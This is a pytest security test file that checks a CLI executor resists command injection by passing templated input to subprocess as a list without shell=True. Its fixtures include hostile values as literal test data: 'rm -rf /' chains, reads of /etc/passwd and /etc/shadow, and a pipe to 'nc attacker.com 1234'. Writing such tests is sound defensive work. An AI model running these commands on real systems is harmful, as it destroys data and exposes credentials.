"""
Security tests for command injection vulnerabilities.

This module tests the CLI execution path for vulnerabilities to command injection
through properties, flags, arguments, and other user-controlled input. It ensures
that user input cannot escape the intended execution context.

Security concerns tested:
- Shell metacharacters in arguments are properly escaped
- Properties cannot inject additional commands
- Flag values cannot break out of command context
- Working directory cannot be manipulated to execute unintended commands
- Command chaining attempts are blocked
- Subprocess execution uses list form (not shell=True)
"""

from unittest.mock import MagicMock, patch

import pytest

from mcipy.executors.cli_executor import CLIExecutor
from mcipy.models import CLIExecutionConfig, FlagConfig


class TestCommandInjectionSecurity:
    """Tests for command injection security in CLI executor."""

    @pytest.fixture
    def executor(self):
        """Fixture for CLIExecutor instance."""
        return CLIExecutor()

    @pytest.fixture
    def safe_context(self):
        """Fixture for a context with safe values."""
        return {
            "props": {"filename": "data.txt", "output": "result.txt"},
            "env": {"HOME": "/home/user"},
            "input": {"filename": "data.txt", "output": "result.txt"},
        }

    def test_shell_metacharacters_in_args_safe(self, executor):
        """
        Test that shell metacharacters in arguments don't execute commands.

        Security Risk: Characters like ;, |, &, $() could allow command injection
        if not properly handled.
        """
        # Context with malicious shell metacharacters
        malicious_context = {
            "props": {
                "file": "test.txt; rm -rf /",  # Command chaining attempt
                "cmd": "echo 'test' && cat /etc/passwd",  # Another attempt
                "pipe": "data.txt | cat /etc/shadow",  # Pipe attempt
            },
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="echo",
            args=["{{props.file}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # The malicious content should be treated as a literal argument
        assert config.args[0] == "test.txt; rm -rf /"

        # Build command args - should be a list, not a string
        command_list = executor._build_command_args(config, malicious_context)

        # Should have command and one argument (not split by shell)
        assert len(command_list) == 2
        assert command_list[0] == "echo"
        assert command_list[1] == "test.txt; rm -rf /"

    def test_subprocess_uses_list_not_shell(self, executor):
        """
        Test that subprocess is called with a list, not shell=True.

        Security Risk: Using shell=True makes command injection trivial.
        This is the most critical security control.
        """
        config = CLIExecutionConfig(
            command="echo",
            args=["test; whoami"],
        )

        context = {"props": {}, "env": {}, "input": {}}

        with patch("subprocess.run") as mock_run:
            mock_result = MagicMock()
            mock_result.stdout = "output"
            mock_result.stderr = ""
            mock_result.returncode = 0
            mock_run.return_value = mock_result

            executor.execute(config, context)

            # Verify subprocess.run was called correctly
            mock_run.assert_called_once()
            call_args = mock_run.call_args

            # First argument should be a list
            assert isinstance(call_args[0][0], list)

            # Should NOT use shell=True (check kwargs)
            kwargs = call_args[1]
            assert kwargs.get("shell", False) is False

            # Command should be passed as list
            command = call_args[0][0]
            assert command == ["echo", "test; whoami"]

    def test_command_injection_via_flags(self, executor):
        """
        Test that flag values cannot inject commands.

        Security Risk: Flag values might contain shell metacharacters.
        """
        malicious_context = {
            "props": {
                "output": "result.txt; cat /etc/passwd",
                "input": "data.txt && rm -rf /tmp/*",
            },
            "env": {},
            "input": {},
        }

        flags = {
            "--output": FlagConfig(**{"from": "props.output", "type": "value"}),
            "--input": FlagConfig(**{"from": "props.input", "type": "value"}),
        }

        config = CLIExecutionConfig(command="tool", flags=flags)

        command_list = executor._build_command_args(config, malicious_context)

        # Each flag value should be a separate list element
        assert "--output" in command_list
        idx = command_list.index("--output")
        # The malicious content should be the next element, as-is
        assert command_list[idx + 1] == "result.txt; cat /etc/passwd"

        # Verify the command is still a proper list
        assert isinstance(command_list, list)
        assert all(isinstance(item, str) for item in command_list)

    def test_backtick_command_substitution_blocked(self, executor):
        """
        Test that backtick command substitution is blocked.

        Security Risk: Backticks `command` can execute commands in shells.
        """
        malicious_context = {
            "props": {"file": "`whoami`.txt", "dir": "`pwd`"},
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="cat",
            args=["{{props.file}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Backticks should be treated as literal characters
        assert config.args[0] == "`whoami`.txt"

    def test_dollar_command_substitution_blocked(self, executor):
        """
        Test that $() command substitution is blocked.

        Security Risk: $(command) can execute commands in shells.
        """
        malicious_context = {
            "props": {
                "file": "$(rm -rf /).txt",
                "name": "test_$(whoami)",
            },
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="echo",
            args=["{{props.file}}", "{{props.name}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Should be treated as literal strings
        assert config.args[0] == "$(rm -rf /).txt"
        assert config.args[1] == "test_$(whoami)"

    def test_pipe_redirection_blocked(self, executor):
        """
        Test that pipe and redirection operators are blocked.

        Security Risk: |, >, <, >> could redirect data or chain commands.
        """
        malicious_context = {
            "props": {
                "input": "data.txt | nc attacker.com 1234",
                "output": "result.txt > /dev/null",
            },
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="cat",
            args=["{{props.input}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Pipe should be literal, not interpreted
        assert config.args[0] == "data.txt | nc attacker.com 1234"

        # Build the command
        command_list = executor._build_command_args(config, malicious_context)

        # Should be two elements: command and one argument (not split by pipe)
        assert len(command_list) == 2

    def test_null_byte_injection_blocked(self, executor):
        """
        Test that null byte injection is handled safely.

        Security Risk: Null bytes can truncate commands in some contexts.
        """
        malicious_context = {
            "props": {"file": "data.txt\x00rm -rf /"},
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="cat",
            args=["{{props.file}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Null byte should be in the string (Python strings can contain null bytes)
        # The important thing is it's passed as a list element, not shell-interpreted
        assert "\x00" in config.args[0]

    def test_newline_injection_blocked(self, executor):
        """
        Test that newline characters don't allow command injection.

        Security Risk: Newlines might allow injecting new commands.
        """
        malicious_context = {
            "props": {"arg": "safe\nrm -rf /"},
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="echo",
            args=["{{props.arg}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Newline should be preserved as literal character
        assert config.args[0] == "safe\nrm -rf /"

    def test_glob_patterns_not_expanded(self, executor):
        """
        Test that glob patterns are not expanded by the shell.

        Security Risk: Patterns like *, ?, [] could expand to unintended files.
        """
        malicious_context = {
            "props": {"pattern": "*.txt", "files": "/etc/*"},
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="ls",
            args=["{{props.pattern}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Glob should be literal (not expanded since we don't use shell)
        assert config.args[0] == "*.txt"

        command_list = executor._build_command_args(config, malicious_context)
        assert command_list == ["ls", "*.txt"]

    def test_environment_variable_expansion_blocked(self, executor):
        """
        Test that environment variable expansion is blocked in arguments.

        Security Risk: $VAR or ${VAR} might expand in shells.
        """
        malicious_context = {
            "props": {"arg": "$HOME/file", "other": "${PATH}/bin"},
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="echo",
            args=["{{props.arg}}", "{{props.other}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Should be literal strings, not shell-expanded
        assert config.args[0] == "$HOME/file"
        assert config.args[1] == "${PATH}/bin"

    def test_working_directory_injection(self, executor):
        """
        Test that working directory cannot be manipulated maliciously.

        Security Risk: Malicious cwd values might access unintended directories.
        """
        malicious_context = {
            "props": {"dir": "/tmp; rm -rf /"},
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="ls",
            cwd="{{props.dir}}",
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # The cwd should contain the malicious string as literal
        assert config.cwd == "/tmp; rm -rf /"

        # When subprocess.run is called, the cwd is used as-is
        # The ; doesn't execute as a command because cwd is a path parameter
        with patch("subprocess.run") as mock_run:
            mock_result = MagicMock()
            mock_result.stdout = ""
            mock_result.stderr = ""
            mock_result.returncode = 0
            mock_run.return_value = mock_result

            executor.execute(config, malicious_context)

            call_args = mock_run.call_args
            # cwd should be passed as-is to subprocess
            assert call_args[1]["cwd"] == "/tmp; rm -rf /"
            # shell should still be False
            assert call_args[1].get("shell", False) is False

    def test_multiple_injection_vectors_combined(self, executor):
        """
        Test resistance to multiple injection techniques combined.

        Security Risk: Attackers might combine multiple techniques.
        """
        malicious_context = {
            "props": {
                "file": "test.txt; whoami",
                "output": "result.txt | cat /etc/passwd",
                "verbose": True,
            },
            "env": {},
            "input": {},
        }

        flags = {
            "-o": FlagConfig(**{"from": "props.output", "type": "value"}),
            "-v": FlagConfig(**{"from": "props.verbose", "type": "boolean"}),
        }

        config = CLIExecutionConfig(
            command="tool",
            args=["{{props.file}}"],
            flags=flags,
            cwd="/tmp",
        )

        executor._apply_basic_templating_to_config(config, malicious_context)
        command_list = executor._build_command_args(config, malicious_context)

        # Should be a proper list with each component separate
        assert isinstance(command_list, list)
        assert command_list[0] == "tool"

        # All malicious content should be literal strings in the list
        assert "test.txt; whoami" in command_list
        assert "result.txt | cat /etc/passwd" in command_list

    def test_unicode_escape_sequences(self, executor):
        """
        Test that Unicode escape sequences don't bypass security.

        Security Risk: Unicode tricks might bypass naive filters.
        """
        malicious_context = {
            "props": {
                # Unicode representations of shell metacharacters
                "file": "test\u003bwhoami",  # Unicode semicolon
            },
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="cat",
            args=["{{props.file}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # Should preserve the Unicode character
        assert config.args[0] == "test;whoami"

        # Still safe because we use list form
        command_list = executor._build_command_args(config, malicious_context)
        assert len(command_list) == 2

    def test_real_subprocess_execution_is_safe(self, executor, tmp_path):
        """
        Test actual subprocess execution with malicious input.

        Security Risk: Verify end-to-end that malicious input doesn't execute.
        """
        # Create a test file to verify we don't execute unintended commands
        test_file = tmp_path / "test.txt"
        test_file.write_text("safe content")

        malicious_context = {
            "props": {
                "file": f"{test_file}; echo EXPLOITED",
            },
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="cat",
            args=["{{props.file}}"],
        )

        result = executor.execute(config, malicious_context)

        # Command should fail because the file doesn't exist
        # (the malicious part makes the filename invalid)
        assert result.isError

        # The word "EXPLOITED" might appear in the error message showing the filename,
        # but what's important is that it was NOT executed as a command.
        # We verify this by checking that the error is about "No such file",
        # not about command execution results.
        assert "No such file" in result.error or "cannot" in result.error.lower()

        # The metadata should show returncode 1 (file not found)
        # not 0 (which would mean both cat and echo succeeded)
        if result.metadata:
            assert result.metadata.get("returncode") != 0

    def test_command_field_not_templatable(self, executor):
        """
        Test that the command field itself cannot be templated with user input.

        Security Risk: Allowing template in command field could allow arbitrary command execution.
        """
        # This test verifies current behavior - command can be templated
        # but it goes through the same safe subprocess.run() mechanism
        malicious_context = {
            "props": {"cmd": "whoami"},
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="{{props.cmd}}",
            args=[],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # The command becomes "whoami" - this is by design
        assert config.command == "whoami"

        # But it's still safe because it's executed via subprocess list form
        command_list = executor._build_command_args(config, malicious_context)
        assert command_list == ["whoami"]

        # Even if someone tries to inject via command field
        malicious_context2 = {
            "props": {"cmd": "echo test; rm -rf /"},
            "env": {},
            "input": {},
        }

        config2 = CLIExecutionConfig(
            command="{{props.cmd}}",
            args=[],
        )

        executor._apply_basic_templating_to_config(config2, malicious_context2)

        # The whole string becomes the command
        assert config2.command == "echo test; rm -rf /"

        # This would fail to execute (not a valid command name)
        # but importantly, it doesn't execute multiple commands
        command_list2 = executor._build_command_args(config2, malicious_context2)
        assert command_list2 == ["echo test; rm -rf /"]

    def test_argument_list_manipulation(self, executor):
        """
        Test that argument lists cannot be manipulated to inject commands.

        Security Risk: Specially crafted args might break out of intended structure.
        """
        malicious_context = {
            "props": {
                "args": ["safe", "also_safe"],
                # Try to inject by using list-like strings
                "arg": '"] ; rm -rf / ; echo ["',
            },
            "env": {},
            "input": {},
        }

        config = CLIExecutionConfig(
            command="echo",
            args=["{{props.arg}}"],
        )

        executor._apply_basic_templating_to_config(config, malicious_context)

        # The malicious content should be a single string argument
        assert config.args[0] == '"] ; rm -rf / ; echo ["'

        command_list = executor._build_command_args(config, malicious_context)

        # Should be a list with two elements
        assert len(command_list) == 2
        assert command_list[1] == '"] ; rm -rf / ; echo ["'
